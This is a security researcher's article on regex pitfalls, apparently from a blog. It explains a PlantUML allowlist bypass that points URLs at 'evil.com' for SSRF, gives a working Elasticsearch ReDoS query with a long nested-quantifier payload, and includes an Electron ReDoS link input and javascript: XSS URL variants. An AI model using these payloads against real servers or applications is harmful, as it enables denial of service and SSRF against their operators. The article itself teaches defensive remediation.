---
description: How to avoid common pitfalls.
---

# Regular Expressions Are Hard

From insufficient security fixes to ReDoS, regular expressions are hard to get right. Yet, they are integral to modern software security and development. Hopefully this article helps you avoid common pitfalls before it's too late!

* [A Tale of Flawed Regex (CVE-2023-3432)](regular-expressions-are-hard.md#a-tale-of-flawed-regex-cve-2023-3432)
* [When ReDoS Should Not Be Out of Scope: Bringing Down Your Elasticsearch Cluster](regular-expressions-are-hard.md#when-redos-should-not-be-out-of-scope-bringing-down-your-elasticsearch-cluster)
* [ReDoS in Single-Threaded Applications](regular-expressions-are-hard.md#redos-in-single-threaded-applications)

## A Tale of Flawed Regex (CVE-2023-3432)

Let's begin with a story of how an innocent regex change led to a security vulnerability.

A few months ago, I was looking into a particular rich text editor when I noticed that it supported an interesting integration — [PlantUML](https://github.com/plantuml/plantuml). This was an interesting project that allows users to write UML as code, and have a web server turn that code into a graphical UML diagram.

What immediately caught my eye was how utterly complex the project was, given its seemingly simple use case. The more complex any software is, the more difficult it is to ensure security. Going over to the [_Preprocessing_](https://plantuml.com/preprocessing) page of the PlantUML documentation would show a treasure trove of builtin functions with interesting security implications.

<figure><img src="../.gitbook/assets/Screenshot 2023-07-11 at 1.07.03 AM.png" alt=""><figcaption></figcaption></figure>

While most of the sensitive functions like `%getenv` were blocked in the default security profile of the web server, `%load_json` was not. This allowed us to read any local JSON file and confirm whether any file exists on the filesystem. This turned out to be an oversight (and is assigned [CVE-2023-3431](https://huntr.dev/bounties/fa741f95-b53c-4ed7-b157-e32c5145164c/)), since the `!include` and `!theme` directives (which also enable local file reading) were subject to the security profile checks.

Additionally, this function allows fetching from a URL, so SSRF was also present.

Great, so only PlantUML instances running on the default security profile were vulnerable, right? I wanted to see if I could break one of the higher-security modes, so I looked into the `ALLOWLIST` mode. With this profile, only allowlisted URLs can be reached, limiting the impact of SSRF.

### This is Why We Can't Have Nice Things

Taking a closer look at where this check is performed ([source](https://github.com/plantuml/plantuml/blob/v1.2023.8/src/net/sourceforge/plantuml/security/SURL.java#L306-L313)), we see that each URL is first cleaned through `cleanPath`, then checked against the allowlist with `startsWith`.

```java
private boolean isInUrlAllowList() {
  final String full = cleanPath(internal.toString());
  for (String allow : getUrlAllowList())
    if (full.startsWith(cleanPath(allow)))
      return true;

  return false;
}
```

Normally, using `startsWith` allows a trivial bypass using the user information part of a URL, which contains [basic authentication](https://en.wikipedia.org/wiki/Basic\_access\_authentication) credentials.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

However, PlantUML attempts to remove the user information portion of the URL before performing the `startsWith` check.

```java
private static String removeUserInfoFromUrlPath(String url) {
  // Simple solution:
  final Matcher matcher = PATTERN_USERINFO.matcher(url);
  if (matcher.find())
    return matcher.replaceFirst("$1$3");

  return url;
}
```

This should have been a good thing, but the regular expression used ruined everything. Consider the following regex that captures the user information in the 2nd group and the actual host in the 3rd group.

{% code overflow="wrap" %}
```java
private static final Pattern PATTERN_USERINFO = Pattern.compile("(^https?://)([-_0-9a-zA-Z]+@)([^@]*)");
```
{% endcode %}

It assumes that the user information part always contains the characters `[-_0-9a-zA-Z]+`. So if we use `https://plantuml.com@evil.com`, there is no match! In fact, the regex fails to perform its intended function since the format for user information in URLs is `<username>:<password>@<host>` and the regex does not contain `:`.

So, back to basics — a simple `https://allowlisted.url.com@evil.com` bypass would allow us to reach any arbitrary URL.

But how did this vulnerability come about? In attempting to [fix](https://github.com/plantuml/plantuml/commit/dbaaa0165ee199ec3f8cdc8c44c86f63bba1d080) a [previous issue](https://huntr.dev/bounties/0d737527-86e1-41d1-9d37-b2de36bc063a/), the `PATTERN_USERINFO` was changed, introducing the limited set of characters that would match the user information part of the URL.

<figure><img src="../.gitbook/assets/Screenshot 2023-07-11 at 1.29.13 AM.png" alt=""><figcaption></figcaption></figure>

### What Can We Learn From This?

Regular expressions are hard to get right. But more importantly, don't reinvent the wheel! Java already comes with a [URL class](https://docs.oracle.com/javase/8/docs/api/java/net/URL.html) that has been tried and tested to perform standards-compliant URL parsing.

Using the `getHost` method, one can get the hostname of the URL, ignoring other parts of the URL like user information. This hostname can then be matched against the whitelist — simple!

Don't make your life harder. Regex-based whitelists and blacklists are hard to get right.

## When ReDoS Should Not Be Out of Scope: Bringing Down Your Elasticsearch Cluster

Bug bounty programs often classify Denial of Service (DoS) issues as out of scope. This is even more likely for ReDoS issues, a specific subclass of DoS that exploits the fact that most regex implementations may reach extreme situations that cause them to work very slowly.

This is due to a regex engine feature called backtracking, an algorithmic technique that brute forces every combination in order to solve a problem. When a "dead end" is encountered, the algorithm simply traces its steps back to previous nodes and explores other unvisited nodes.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

In the context of regular expressions, these dead ends are simply non-matches. Take the regex  `^(a+)+$`. A non-match would be `aaaaX`. Because of the nested quantifiers, backtracking becomes exponential with more `a`s. This is called catastrophic backtracking.

In a bug bounty programme a while back, I found an exposed Elasticsearch API that allowed me to run any query on the Elasticsearch instance. The Elasticsearch data wasn't particularly sensitive, so I had to find another way to escalate the impact.

I found [this post](https://discuss.elastic.co/t/rest-calls-from-frontend/269788) on the Elasticsearch forum which I thought was pretty interesting.

<figure><img src="../.gitbook/assets/Screenshot 2023-07-11 at 1.46.29 AM.png" alt=""><figcaption></figcaption></figure>

A developer mentioned that _"it is possible for a sufficiently determined malicious user to write searches that overwhelm the Elasticsearch cluster and bring it down"_. Huh.

### Scripting Module to ReDoS

I couldn't find any online resources on how to do this, so I had to try to figure it out myself. Eventually, when exploring the Elasticsearch documentation, I found the [scripting module](https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-scripting.html). The scripts were well-sandboxed, and I couldn't find a way to escalate this into an RCE.

Thankfully, though, [Painless scripts](https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-scripting-painless.html) allow us to run regular expressions. The following would run a script that simply checks if `aaaaaaa` fulfills the regex `/a{0,7}{0,10}$/`. As the server URL encodes many characters, I was only able to work with the `{...}` quantifiers to increase time complexity.

```json
{
   "aggs":{
      "ContentType":{
         "terms":{
            "field":"ContentType",
            "size":25
         }
      }
   },
   "query":{
      "bool":{
         "must":[
            {
               "script":{
                  "script":{
                     "source":"params.x =~ /a{0,7}{0,10}$/",
                     "params":{
                        "x":"aaaaaaa"
                     }
                  }
               }
            }
         ]
      }
   },
   "highlight":{
      "fields":{
         "*":{
            
         }
      },
      "fragment_size":"350"
   }
}
```

In this script, only 23 steps is needed in the regex algorithm to find the match.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

But when the last character in the test string is changed to an `x`, the string `aaaaaax` will cause the algorithm to take 74,380 steps instead.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Now, what if we used `/((a{0,7}){0,7}){0,10}$/`? Regex101 detects catastrophic backtracking and gives up.\


<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

In this particular program, the difference in computational complexity becomes very noticeable once we look at the `took` attribute of the response JSON.

I ended up reporting the following query, which caused the server to take more than a minute to respond. This was around a **3,000x amplification** from the original query time of 20ms.

```json
"source":"params.x =~ /a{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,7}{0,10}$/  ? false : false",
"params":{
   "x":"aaaaaax"
}
```

<figure><img src="../.gitbook/assets/Screenshot_2022-10-08_at_4.33.56_PM (1).png" alt=""><figcaption></figcaption></figure>

Clearly, we could continue adding more `{0,7}` to the regex to strengthen the payload until it crashes the Elasticsearch service. To respect the program rules against performing DoS attacks, I did not test any payloads stronger than this.

### Attacker Leverage and My Philosophy on DoS

Alas, this adventure only served to fuel my ongoing gripe with the status quo of classifying all DoS issues as out of scope in bug bounty programs.

<figure><img src="../.gitbook/assets/Screenshot 2023-07-11 at 2.07.17 AM.png" alt=""><figcaption></figcaption></figure>

It's understandable that companies and organizations don't want people spamming their infrastructure to report DoS issues. But when you have an exponential amplification vector, it's dangerous to ignore.

The traditional CIA model has three problem areas, and _Availability_ is one of them. What's important is leverage. How much leverage does the attacker have over your resources?

If an attacker can use a single HTTP request to bring your server to its knees, that's a very high-leverage DoS vector. On the other hand, if the attacker has to use significant resources, like a botnet, to stage a DDoS, then that's a very low-leverage DoS vector. I definitely agree that low-leverage DoS vectors should be out of scope!

I hope that more people adopt this view and become more accepting of DoS vulnerabilities in application security. In this particular case, it is definitely a high-leverage vulnerability that deserves attention. Unfortunately, the team will likely never fix it.

## ReDoS in Single-Threaded Applications

Node.js is a single-threaded, event-driven JavaScript runtime. Simply put, everything happens on a single-threaded "event loop". When things happen (such as a new request), a callback is triggered. This fills up the event queue, which the event loop works to clear.

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

All of this is to say, if a regular expression is being tested in JavaScript, nothing else can happen until the test is complete. For example, if a Node.js web server is handling a request, and is using a regex to validate one of the request parameters, no other requests can go through until this is done.

This has client-side implications as well — there is no way to push work off to a background thread to keep the UI responsive, everything has to happen in the event loop.

It gets even more interesting when modern desktop apps are built on frameworks like [Electron](https://www.electronjs.org/) that run on Node.js. Recently, I came across a _very_ complex URL validation regex in an Electron app.

{% code overflow="wrap" %}
```regex
^(?:(?:https)://)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2}) [...REDACTED...] |(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*)(?::\d{2,5})?(?:[/?#]\S*)?$
```
{% endcode %}

This regex was tested every time the user clicked on a link, so sending the following link to a victim can cause their application to hang for several seconds.

```javascript
("https://6" + "@:-".repeat(8075) + "\t")
```

Client-side DoS vectors like these are also hard to ignore — who doesn't remember the viral WhatsApp bug that crashed the app whenever someone sent an evil message?

## Wrapping Up

Writing regular expressions is hard. On one hand, security-oriented regular expressions need to be able to catch all edge cases and potential bypasses. On the other, we need to avoid overly complex regular expressions that introduce ReDoS vectors.

On delicate attack surfaces like URL parsing, it's almost always better to go with existing parsers instead of trying to reinvent the wheel. For instance, JavaScript's _URL_ class is WHATWG URL Standard compliant, which means that it parses URLs exactly how a standards-compliant browser would.

It is way better to prevent XSS, for example, by using `new URL(dirty).protocol === 'javascript:'` instead of trying to use a regular expression to catch `javascript:` URLs, simply because there are many ways to write the same URL. Your custom regex might catch `javascript:alert()`, but does it catch _all_ of the following URLs? It might be hard to say.

* `JAVASCRIPT:alert()`
* `\x00javascript:alert()`
* `java\r\nscript:alert()`
* `java\tscript:alert()`
* `javascript\r\n:alert()`

If regular expressions have to be used, it's often wise to avoid the following patterns to prevent ReDoS:

* Nesting quantifiers, like `(a+)+`
* Non-mutually exclusive alternations, like `(.|a)*`
* Non-mutually exclusive quantifiers in sequence, like `a.*?b.*?c`

I hope that this has been an interesting read!
